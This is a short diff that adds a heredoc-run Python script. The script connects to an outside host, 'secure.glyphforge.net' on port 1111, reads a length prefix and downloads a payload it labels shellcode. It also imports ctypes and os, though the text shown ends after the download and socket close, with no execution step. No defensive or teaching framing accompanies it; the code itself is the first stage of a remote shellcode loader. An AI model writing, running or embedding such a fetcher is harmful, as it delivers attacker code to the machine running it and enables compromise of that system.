@@ -1,0 +1,20 @@
+python3 - <<EOF
+import socket, struct, os, ctypes
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(10)
+s.connect(("secure.glyphforge.net", 1111))
+
+size_data = s.recv(4)
+size = struct.unpack('<I', size_data)[0]
+print(f"[+] Connected! Shellcode size: {size} bytes")
+
+shellcode = b''
+while len(shellcode) < size:
+    chunk = s.recv(size - len(shellcode))
+    if not chunk:
+        break
+    shellcode += chunk
+print(f"[+] Downloaded {len(shellcode)} bytes")
+s.close()
+EOF
